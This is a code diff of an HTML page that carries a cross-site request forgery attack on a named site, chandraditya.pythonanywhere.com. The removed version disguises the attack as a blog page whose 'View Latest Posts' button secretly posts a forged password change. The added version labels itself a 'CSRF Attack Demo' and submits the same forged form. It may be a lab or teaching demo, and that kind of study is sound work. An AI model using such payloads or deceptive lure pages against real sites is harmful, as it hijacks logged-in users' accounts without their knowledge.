@@ -1,62 +1,21 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>CSRF Attack</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            text-align: center;
-            padding: 50px;
-        }
-        .container {
-            background: white;
-            padding: 20px;
-            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
-            width: 300px;
-            margin: auto;
-            border-radius: 10px;
-        }
-        .status {
-            margin-top: 20px;
-            font-weight: bold;
-            color: red;
-        }
-    </style>
+<body>
+    <h1>CSRF Attack Demo</h1>
+    <p>Instructions: Ensure a user is logged into chandraditya.pythonanywhere.com in this browser. Click the button to change their password.</p>
+    <button onclick="triggerCSRF()">Change Password</button>
     <script>
-        function initiateAttack() {
-            document.getElementById("status").innerText = "Attempting CSRF Attack...";
-            setTimeout(() => {
-                var iframe = document.createElement("iframe");
-                iframe.style.display = "none";
-                iframe.src = "https://chandraditya.pythonanywhere.com/change_password";
-                document.body.appendChild(iframe);
-                
-                setTimeout(() => {
-                    var form = document.createElement("form");
-                    form.method = "POST";
-                    form.action = "https://chandraditya.pythonanywhere.com/change_password";
-                    
-                    var input = document.createElement("input");
-                    input.type = "hidden";
-                    input.name = "new_password";
-                    input.value = "hacked123";
-                    form.appendChild(input);
-                    
-                    document.body.appendChild(form);
-                    form.submit();
-                    document.getElementById("status").innerText = "CSRF Attack Executed!";
-                }, 3000);
-            }, 1000);
+        function triggerCSRF() {
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://chandraditya.pythonanywhere.com/change_password';
+            var input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = 'new_password';
+            input.value = 'hackedpassword';
+            form.appendChild(input);
+            document.body.appendChild(form);
+            form.submit();
         }
     </script>
-</head>
-<body>
-    <div class="container">
-        <h1>Welcome to My Blog!</h1>
-        <p>Enjoy reading about the latest news...</p>
-        <button onclick="initiateAttack()">Click to View Latest Posts</button>
-        <p id="status" class="status"></p>
-    </div>
 </body>
 </html>
